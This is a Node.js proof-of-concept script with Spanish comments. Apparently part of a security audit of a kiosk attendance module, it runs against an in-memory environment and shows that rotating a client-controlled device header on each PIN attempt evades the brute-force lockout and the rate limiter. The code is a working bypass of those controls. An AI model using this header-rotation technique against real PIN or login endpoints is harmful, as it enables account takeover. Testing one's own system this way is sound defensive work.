// 06-bypass-backoff-dispositivo.mjs — ¿Se puede eludir el bloqueo por fuerza bruta
// de PIN (y el rate limiter) rotando el valor del header `x-presentia-dispositivo`
// (controlado 100% por el cliente, sin validar) en cada intento?
//
// tanto el rate limiter (`entrar:${dispositivo}:${empleadoId}`) como el contador de
// intentos fallidos de PIN (presentia_pin_intentos, PK (empleado_id, dispositivo))
// están indexados por `dispositivo`, que en producción llega del header HTTP
// `x-presentia-dispositivo`. Entorno PROPIO en memoria.
import { crearReferenceEnv } from '../../src/dev/reference-env.js';
import { crearModulo } from '../../src/index.js';
import { kiosk } from '../../src/http/handlers.js';
import crypto from 'node:crypto';

function ctx(modulo, dispositivo, o = {}) {
  return {
    actor: o.actor ?? null, canal: 'kiosk', body: o.body ?? {}, query: o.query ?? {},
    params: {}, dispositivo,
    rate: modulo.rate, kioskSessions: modulo.kioskSessions, formato: o.formato, now: modulo.deps.clock.now,
  };
}

const env = crearReferenceEnv();
const modulo = crearModulo(env);
const deps = modulo.deps;

console.log('Objetivo: adivinar el PIN de "e1" (real: 4728) probando PINs al azar,');
console.log('rotando el header x-presentia-dispositivo en CADA petición.\n');

let intentos = 0;
let bloqueosVistos = 0;
let rateVisto = 0;
const candidatos = [];
for (let i = 0; i < 200 && candidatos.length < 200; i++) candidatos.push(String(i).padStart(4, '0'));
// evitamos el verdadero para medir cuántos intentos "gratis" concede antes de acertarlo aparte
const inicio = Date.now();
let acertado = false;
for (const pin of candidatos) {
  const dispositivoFalso = crypto.randomUUID(); // <- rota en cada intento, como haría un atacante
  intentos++;
  try {
    const r = kiosk.entrar(deps, ctx(modulo, dispositivoFalso, { body: { empleadoId: 'e1', pin } }));
    if (r.token) { acertado = true; console.log(`PIN acertado en el intento #${intentos}: ${pin}`); break; }
  } catch (e) {
    if (e.code === 'PIN_BLOQUEADO') bloqueosVistos++;
    if (e.code === 'RATE') rateVisto++;
    // PIN_INCORRECTO es el caso normal: seguimos probando.
  }
}
const ms = Date.now() - inicio;

console.log(`\nIntentos realizados: ${intentos}`);
console.log(`Veces que saltó PIN_BLOQUEADO: ${bloqueosVistos}`);
console.log(`Veces que saltó RATE (429): ${rateVisto}`);
console.log(`PIN acertado: ${acertado}`);
console.log(`Tiempo de proceso (ms, sin red real): ${ms}`);

console.log('\n--- Filas en presentia_pin_intentos tras el ataque (una por "dispositivo" falso) ---');
const filas = deps.db.prepare('SELECT COUNT(*) n FROM presentia_pin_intentos WHERE empleado_id = ?').get('e1');
console.log('Número de filas de intentos para e1 (una por dispositivo distinto usado):', filas.n);

console.log('\n================ CONCLUSIÓN ================');
if (bloqueosVistos === 0 && rateVisto === 0) {
  console.log('NI el bloqueo por fuerza bruta NI el rate limiter se activaron en ningún momento,');
  console.log('a pesar de haber realizado', intentos, 'intentos consecutivos de PIN contra el mismo');
  console.log('empleado. Rotar `x-presentia-dispositivo` (cabecera 100% controlada por el cliente,');
  console.log('sin validar) resetea de facto el contador de fallos y la ventana del rate limiter,');
  console.log('porque ambos usan `dispositivo` como parte de la clave. El espacio de un PIN de 4');
  console.log('dígitos (10.000 combinaciones) queda así abierto a fuerza bruta SIN bloqueo efectivo.');
} else {
  console.log('Se activaron controles durante el ataque (revisar los contadores anteriores).');
}
